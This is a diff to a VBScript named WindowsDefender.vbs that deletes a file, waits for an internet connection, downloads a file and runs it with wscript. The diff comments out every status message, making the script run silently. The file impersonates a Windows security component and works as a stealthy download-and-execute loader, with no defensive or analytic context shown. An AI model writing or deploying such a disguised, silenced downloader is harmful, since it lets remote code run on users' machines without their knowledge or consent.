@@ -18,10 +18,10 @@ Start()
 
 sub Start()
 	If objFSO.FileExists(toRun) Then
-		WScript.Echo "File Exists (from WindowsDefender.vbs)" 
+		'WScript.Echo "File Exists (from WindowsDefender.vbs)" 
 		objFSO.DeleteFile toRun, True '[force deletion]
 	Else
-		WScript.Echo "File Doesn't Exists (from WindowsDefender.vbs)"
+		'WScript.Echo "File Doesn't Exists (from WindowsDefender.vbs)"
 	End If
 	CheckInternetConnection
 End sub
@@ -33,11 +33,11 @@ sub CheckInternetConnection()
     objHTTP.send ""
     On Error GoTo 0
     If objHTTP.status = 200 Then
-        WScript.Echo "Internet is connected! (from WindowsDefender.vbs)"
+        'WScript.Echo "Internet is connected! (from WindowsDefender.vbs)"
 		DownloadFile
 		RunScript
     Else
-		WScript.Echo "Internet is not connected! (from WindowsDefender.vbs)"
+		'WScript.Echo "Internet is not connected! (from WindowsDefender.vbs)"
 		WScript.Sleep 3000
 		CheckInternetConnection
     End If
@@ -57,7 +57,7 @@ sub DownloadFile()
 
     ' Handle errors during the request
     If Err.Number <> 0 Then
-        WScript.Echo "Error during download request: " & Err.Description
+        'WScript.Echo "Error during download request: " & Err.Description
         Exit Sub
     End If
 
@@ -75,10 +75,10 @@ sub DownloadFile()
 
     ' Handle errors during the file save
     If Err.Number <> 0 Then
-        WScript.Echo "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs)"
+        'WScript.Echo "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs)"
 		Exit Sub
     Else
-        WScript.Echo "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)"
+        'WScript.Echo "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)"
     End If
 
     On Error GoTo 0 ' Disable error handling
@@ -92,6 +92,6 @@ sub RunScript()
 	If objFSO.FileExists(scriptPath) Then
         CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
     Else
-        WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs)"
+        'WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs)"
     End If
 End sub
